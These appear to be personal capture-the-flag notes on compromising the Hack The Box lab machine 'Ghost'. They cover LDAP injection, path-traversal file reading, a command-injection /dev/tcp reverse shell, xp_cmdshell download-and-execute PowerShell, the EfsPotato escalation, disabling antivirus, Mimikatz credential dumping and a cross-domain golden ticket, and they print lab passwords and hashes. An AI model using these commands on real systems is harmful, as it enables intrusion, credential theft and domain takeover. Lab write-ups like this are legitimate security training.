**Ping** 
![[Pasted image 20240714092032.png]]

Nmap Scans
```
mapit 10.10.11.24
```

Nmap Default Scan
![[Pasted image 20240714092207.png]]

Nmap Script and Service Scan
![[Pasted image 20240714092314.png]]
![[Pasted image 20240714092332.png]]
![[Pasted image 20240714092349.png]]
![[Pasted image 20240714092405.png]]

Nmap All Port Scan
![[Pasted image 20240714093550.png]]
![[Pasted image 20240714093603.png]]

Nmap Script and Service Scan for new Ports
![[Pasted image 20240714093625.png]]

Nmap UDP Scan
![[Pasted image 20240714093653.png]]

Nothing on port 80 and 443

On http://10.10.11.24:8008/
![[Pasted image 20240714093740.png]]

Robots.txt on Port 8008
![[Pasted image 20240714093926.png]]

On http://10.10.11.24:8008/ghost
![[Pasted image 20240714094025.png]]
Got a admin page

On https://10.10.11.24:8443
![[Pasted image 20240714095257.png]]

On https://federation.ghost.htb Login using AD Federation
![[Pasted image 20240714095502.png]]

Found another subdomain for port 8008 using ffuf
```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://ghost.htb:8008 -H "Host: FUZZ.ghost.htb" -fs 7676
```
![[Pasted image 20240714100228.png]]

On http://intranet.ghost.htb:8008/
![[Pasted image 20240714100530.png]]

Ldap Injection Works use * for both username and secret
![[Pasted image 20240714101046.png]]

Leads to Kathryn dashboard
![[Pasted image 20240714101122.png]]

Can see lot of Users
![[Pasted image 20240714101232.png]]

Will try to login via gitea, http://gitea.ghost.htb:8008/
![[Pasted image 20240714120351.png]]

User: gitea_temp_principal  
Pass: szrr8kpc3z6onlqf  
The initial * password I found by just brute forcing with Rockyou.txt.   
All the secrets can be brute forced as I expected above. Just try sz* etc. in a script until you find it.
![[Pasted image 20240714120619.png]]

After lot of enumeration in git repo, found LFI in here 
```
http://ghost.htb:8008/ghost/api/v3/content/posts/?extra=../../../../proc/self/environ&key=37395e9e872be56438c83aaca6
```
This will give us the API key
![[Pasted image 20240714141913.png]]
**DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe**


Will Jump to Privilege Escalation....!









Now will get the shell using this
```
curl http://intranet.ghost.htb:8008/api-dev/scan -X POST -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -H 'Content-Type: application/json' -d '{"url": "0<&196;exec 196<>/dev/tcp/10.10.14.2/443; /bin/bash <&196 >&196 2>&196"}'
```
![[Pasted image 20240714142019.png]]

We can see some sensitive info in .sh file
![[Pasted image 20240714142407.png]]
Will try this 
```
sshpass -p 'uxLmt*udNc6t3HrF' ssh -o "StrictHostKeyChecking no" florence.ramirez@ghost.htb@dev-workstation
```
![[Pasted image 20240714142458.png]]

We are in LINUX-DEV-WS01and its hosts file
![[Pasted image 20240714142821.png]]

Can use florence password to access mysql
```
impacket-mssqlclient florence.ramirez:'uxLmt*udNc6t3HrF'@ghost.htb -windows-auth
```
![[Pasted image 20240714152053.png]]

Also I have used Crackmapexec 
```
crackmapexec smb ghost.htb -u users.txt -p pass.txt --shares --continue-on-success
```
![[Pasted image 20240714154208.png]]
![[Pasted image 20240714154238.png]]
Florence password is valid

I have ran bloodhound 
```
bloodhound-python -d ghost.htb --zip --use-ldap -u florence.ramirez -p 'uxLmt*udNc6t3HrF' -ns 10.10.11.24 -c All
```
![[Pasted image 20240714161305.png]]

This two users can PS-Remote to DC
![[Pasted image 20240714162949.png]]

Used ligolo and started tunnelling, and able to access the internal Ip's
![[Pasted image 20240714185153.png]]
![[Pasted image 20240714185213.png]]
![[Pasted image 20240714185100.png]]
![[Pasted image 20240714185903.png]]
![[Pasted image 20240714185927.png]]

Finally used mysql client to get a reverse shell
```
mssqlclient.py florence.ramirez:'uxLmt*udNc6t3HrF'@10.10.11.24 -windows-auth
 enum_links  
 use_link [PRIMARY]  
 use master  
 exec_as_login sa  
 xp_cmdshell "whoami"
 xp_cmdshell "powershell -c iex(iwr -usebasicparsing http://10.10.14.2/rev.ps1)"
```
![[Pasted image 20240714211031.png]]
![[Pasted image 20240714211047.png]]

Got a shell in Primary
![[Pasted image 20240714211108.png]]
![[Pasted image 20240714211122.png]]




Will Jump to Privilege Escalation....!

We have SeImpersonatePrivilege but AV blocking to run Potato Exploit, but found alternate after a lot of search, EsfPotato.cs https://github.com/zcgonvh/EfsPotato
Transfer the .cs file to target and run the following command
```
C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe EfsPotato.cs -nowarn:1691,618

./EfsPotato.exe 'whoami'
```
![[Pasted image 20240715004559.png]]
![[Pasted image 20240715004539.png]]

Now Shell as NT/Authority
```
./efs.exe 'powershell -c iex(iwr -usebasicparsing http://10.10.14.2/rev.ps1)'
```
![[Pasted image 20240715004650.png]]

Shell
![[Pasted image 20240715004707.png]]

First things first, disabled AV
```
Set-MpPreference -DisableRealtimeMonitoring $true
```

Got PRIMARY machine's Administrator NTLM hash, used Mimikatz
```
 .\mimi.exe "privilege::debug" "lsadump::lsa /patch /" exit
```
![[Pasted image 20240715100938.png]]

So we can get a stable shell using evil-winrm as admin
```
evil-winrm -i 10.0.0.10 -u 'Administrator' -H '41515af3ada195029708a53d941ab751'
```
![[Pasted image 20240715223743.png]]

Need to abuse trust to access DC01.ghost.htb
```
./mimi.exe "lsadump::trust /patch" exit
```
![[Pasted image 20240715223840.png]]
![[Pasted image 20240715223910.png]]

We have trust relationship with ghost.htb, will create a golden ticket, will use mimikatz for TGS
```
./mimi.exe "kerberos::golden /user:Administrator /domain:CORP.GHOST.HTB /sid:S-1-5-21-2034262909-2733679486-179904498-502 /sids:S-1-5-21-4084500788-938703357-3654145966-519 /rc4:dae1ad83e2af14a379017f244a2f5297 /service:krbtgt /target:GHOST.HTB /ticket:golden.kirbi" exit
```
![[Pasted image 20240715224026.png]]
![[Pasted image 20240715224037.png]]

Now will use Rubeus for TGT
```
./Rubeus.exe asktgs /ticket:golden.kirbi /dc:dc01.ghost.htb /service:CIFS/dc01.ghost.htb /nowrap /ptt
```
![[Pasted image 20240715224147.png]]

Will check we have correct cifs
```
klist
```
![[Pasted image 20240715224321.png]]

Now will try to access the DC01.ghost.htb
```
dir \\dc01.ghost.htb\c$
```
![[Pasted image 20240715224407.png]]
 Great.....!

Will get a session in DC01 and get root and user flags

**User.txt**
![[Pasted image 20240715224546.png]]

**Root.txt**
![[Pasted image 20240715224615.png]]

Will get a stable session on DC01 after sometime, 99.9 % work done....!